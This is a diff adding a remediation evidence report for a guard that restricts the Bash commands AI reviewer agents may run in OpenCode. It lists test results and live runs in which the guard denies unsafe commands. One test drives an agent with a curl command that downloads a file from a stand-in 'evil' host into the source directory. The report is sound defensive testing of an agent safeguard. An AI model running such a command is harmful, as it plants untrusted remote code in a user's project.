@@ -1,0 +1,53 @@
+# Batch C reviewer-scope-guard remediation evidence
+
+Date: 2026-07-20
+Branch: feat/grok-4.5-basic-support
+
+## WHAT WAS TESTED
+
+1. TDD dispatcher regressions
+   - Added failures first through `plugin/tool-execute-before.ts` for read-only sg rewrite flags, find write prefixes, pagers, curl remote-write/upload/config/data/form/request/unknown flags, non-F3 `bun run` scripts, `.omo/**` script execution, and sqlite database creation outside allowed roots.
+   - Added preserved-allowance cases for environment prefixes, `&&` chains, worktree lifecycle, scoped mkdir, all four F3 Bun scripts, node tests/trusted scripts, safe curl GET flags, existing sqlite databases, tmux, and OpenCode QA subcommands.
+
+2. Targeted OpenCode adapter suites
+   - Command: `bun test packages/omo-opencode/src/hooks/reviewer-scope-guard/ packages/omo-opencode/src/plugin/ packages/omo-opencode/src/agents/`
+   - Intended proof: policy units, the real tool-execute-before dispatcher, and agent restriction placement remain coherent.
+
+3. Repository gates
+   - Command: `bun test`
+   - Command: `bun run typecheck`
+   - Command: `git diff --check dev...HEAD`
+
+4. Real OpenCode hook surface
+   - OpenCode 1.18.3 loaded `file://.../packages/omo-opencode/src/index.ts` directly, so the changed TypeScript source was exercised without running the forbidden build step.
+   - Used isolated XDG data/config/cache/state roots and a local fake OpenAI Responses server. No provider request left the host.
+   - Drove `opencode run --attach --format json` once as Oracle with `sg --rewrite replacement --pattern old` and once as qa-executor with `curl --output-dir packages/omo-opencode/src -O http://evil/x.ts`.
+   - QA-only agent overrides changed both reviewer modes to `primary` so `opencode run` would select them directly; their agent keys and production guard behavior were otherwise unchanged.
+
+## WHAT WAS OBSERVED
+
+- Red phase: the new focused run produced 17 expected failures for the confirmed escapes and inline qa-executor delegation placement.
+- Green policy/dispatcher phase: 135 passed, 0 failed.
+- Targeted adapter phase: 832 passed, 0 failed, 2,150 assertions across 80 files.
+- Root suite first pass: 12,136 passed with three unrelated timeout-only failures. Each timed-out file passed alone (10/10, 6/6, and 5/5), confirming load sensitivity rather than a Batch C regression.
+- Root suite rerun: 12,139 passed, 3 skipped, 0 failed across 1,529 files.
+- Typecheck: root, script, and all package `tsgo --noEmit` stages exited 0.
+- Changed-path `git diff --check`: exited 0.
+- LSP diagnostics: zero errors in the reviewer-scope-guard directory and all changed agent/shared/dispatcher files.
+- Real Oracle tool result: `status=error`, `[reviewer-scope-guard] read-only grammar denied this Bash command.`
+- Real qa-executor tool result: `status=error`, `[reviewer-scope-guard] qa-executor Bash is limited to the QA allowlist.`
+- SSE captured `message.part.updated` for the driven tool lifecycle.
+- Host OpenCode database isolation: session count 128 before, 128 after, diff 0.
+
+## WHY IT IS ENOUGH
+
+- The dispatcher matrix proves every new denial at the same integration seam OpenCode calls, while preserving the full F3 QA grammar.
+- The shared sg/find inspectors are exercised through both Oracle and qa-executor routes, preventing future role drift.
+- The live source-plugin run proves OpenCode itself invoked the changed `tool.execute.before` guard and surfaced structured tool errors before either unsafe command executed.
+- The complete root suite and typecheck cover non-local regressions in command parsing, path canonicalization, agent prompt restrictions, and package boundaries.
+
+## WHAT WAS OMITTED
+
+- `bun run build` was intentionally omitted because the task forbids it; the real harness imported the source entry directly instead.
+- Real provider API calls and secret-bearing logs were omitted. The fake server used only `qa-nonsecret` inside the isolated sandbox.
+- Raw environment dumps and full model request bodies were not retained.
